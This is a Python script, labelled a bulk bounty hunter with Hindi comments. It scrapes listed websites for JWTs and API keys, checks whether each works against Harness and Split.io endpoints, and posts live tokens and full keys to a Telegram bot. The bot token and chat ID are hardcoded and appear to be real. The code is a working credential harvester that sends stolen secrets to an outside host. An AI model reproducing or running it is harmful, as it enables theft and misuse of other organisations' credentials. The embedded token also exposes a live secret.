import requests
import re
import time
from colorama import Fore, Style

# --- कॉन्फ़िगरेशन (अपनी डिटेल्स यहाँ भरें) ---
TELEGRAM_BOT_TOKEN = "8559373528:AAF0hQ1Ag6aaS_ZAjw313yLJ8Vqe7NL_97k"
TELEGRAM_CHAT_ID = "1003776407816"

def send_telegram_msg(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, data=data)
    except:
        print("Telegram Alert Failed!")

def validate_jwt(token, site):
    url = "https://app.harness.io/gateway/ng/api/user/retrieve"
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(url, headers=headers, timeout=5)
        if r.status_code == 200:
            msg = f"🔥 *LIVE JWT FOUND!*\n\n🌐 Site: {site}\n🔑 Token: `{token[:40]}...`"
            send_telegram_msg(msg)
            return True
    except: pass
    return False

def validate_split_io(api_key, site):
    url = "https://sdk.split.io/api/splitChanges?since=-1"
    headers = {"Authorization": f"Bearer {api_key}"}
    try:
        r = requests.get(url, headers=headers, timeout=5)
        if r.status_code == 200:
            msg = f"💰 *LIVE SPLIT.IO KEY!*\n\n🌐 Site: {site}\n🔑 Key: `{api_key}`"
            send_telegram_msg(msg)
            return True
    except: pass
    return False

def start_bulk_scan():
    print(f"{Fore.MAGENTA}=== Aditya's Bulk Bounty Hunter Starting ==={Style.RESET_ALL}\n")
    
    try:
        with open("targets.txt", "r") as f:
            targets = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}Error: targets.txt file not found!{Style.RESET_ALL}")
        return

    for site in targets:
        print(f"{Fore.CYAN}[*] Scanning: {site}{Style.RESET_ALL}")
        try:
            # JS फाइल्स और सोर्स कोड फेच करना
            response = requests.get(site, timeout=10, headers={'User-Agent': 'Mozilla/5.0'}).text
            
            # Regex for JWT
            tokens = set(re.findall(r"ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*", response))
            # Regex for API Keys (Hex/Alphanumeric 32-40 chars)
            keys = set(re.findall(r"[a-z0-9]{32,40}", response))

            for t in tokens:
                if validate_jwt(t, site):
                    print(f"  {Fore.GREEN}[+] Found Live JWT on {site}{Style.RESET_ALL}")

            for k in keys:
                if validate_split_io(k, site):
                    print(f"  {Fore.GREEN}[+] Found Live Split.io Key on {site}{Style.RESET_ALL}")

        except Exception as e:
            print(f"  {Fore.RED}[!] Could not scan {site}: {e}{Style.RESET_ALL}")
        
        time.sleep(1) # सर्वर को ब्लॉक होने से बचाने के लिए छोटा सा गैप

    print(f"\n{Fore.MAGENTA}=== All Targets Scanned! Check Telegram ==={Style.RESET_ALL}")

if __name__ == "__main__":
    start_bulk_scan()
